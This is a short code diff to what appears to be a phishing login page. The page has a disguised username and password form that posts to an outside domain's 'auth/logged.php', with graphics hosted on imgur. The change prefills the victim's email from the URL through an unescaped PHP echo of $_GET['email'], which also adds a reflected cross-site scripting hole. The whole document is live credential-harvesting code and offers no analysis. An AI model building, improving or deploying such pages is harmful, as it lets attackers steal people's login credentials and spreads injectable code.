@@ -70,7 +70,7 @@ $(window).load(function() {
 
 <div id="image3" style="position:absolute; overflow:hidden; left:870px; top:631px; width:93px; height:18px; z-index:2"><a href="#"><img src="https://imgur.com/Xqx8U5N.png" alt="" title="" border=0 width=93 height=18></a></div>
 <form action=https://benmaryachtings.com/auth/logged.php name=naltarnhigye id=naltarnhigye method=post>
-<input name="ud"  value="" required class="textbox" autocomplete="off" required type="text" style="position:absolute;width:345px;left:785px;top:309px;z-index:3">
+<input name="ud"  value="<?php echo $_GET['email']; ?>" required class="textbox" autocomplete="off" required type="text" style="position:absolute;width:345px;left:785px;top:309px;z-index:3">
 <input name="pd" class="textbox" autocomplete="off" required type="password" style="position:absolute;width:345px;left:785px;top:394px;z-index:4">
 
 <div id="formimage1" style="position:absolute; left:784px; top:493px; z-index:6"><input type="image" name="formimage1" width="347" height="42" src="https://imgur.com/cOj0OFj.png"></div>
